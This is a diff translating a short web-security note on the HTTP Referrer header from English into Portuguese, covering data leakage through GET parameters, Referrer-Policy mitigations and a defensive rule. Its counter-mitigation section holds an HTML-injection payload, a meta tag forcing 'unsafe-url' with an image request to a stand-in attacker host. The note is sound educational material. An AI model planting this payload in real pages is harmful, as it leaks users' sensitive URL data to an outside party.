@@ -1,16 +1,14 @@
-# Interesting HTTP
+# HTTP Interessante
 
-## Referrer headers and policy
+## Headers Referrer e sua política
 
-Referrer is the header used by browsers to indicate which was the previous page visited.
+Referrer é um tipo de header usado pelos navegadores para indicar a ultima página visitada.
 
-### Sensitive information leaked
+### Informação sensível vazada
+Se em algum ponto dentro de uma página web estiver alocado alguma informação sensível nos parametros de uma requisição GET, caso esta página contenha links para fontes externas ou que seja possível um invasor fazer ou sugerir \(engenharia social\) um usuário acessar uma URL controlada pelo mesmo. Se torna possível a extração de informação sensível que está na requisição GET.
 
-If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest \(social engineering\) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.
-
-### Mitigation
-
-You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:
+### Mitigação
+Você pode fazer que o navegador siga uma **Referrer-policy** (política para o header) que pode **evitar** que informações sensíveis sejam repassadas para outras aplicações web.
 
 ```text
 Referrer-Policy: no-referrer
@@ -23,16 +21,14 @@ Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
 
-### Counter-Mitigation
+### Contra-Mitigação
+Você pode reescrever essa regra do header através de uma meta tag no HTML \(o atacante precisa explorar uma vulnerabilidade de HTML Injection):
 
-You can override this rule using an HTML meta tag \(the attacker needs to exploit and HTML injection\):
 
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 
-### Defense
-
-Never put any sensitive data inside GET parameters or paths in the URL.
-
+### Defesa
+Nunca coloque quaisquer informações sensíveis dentro de parâmetros ou caminhos na URL de uma requisição GET 
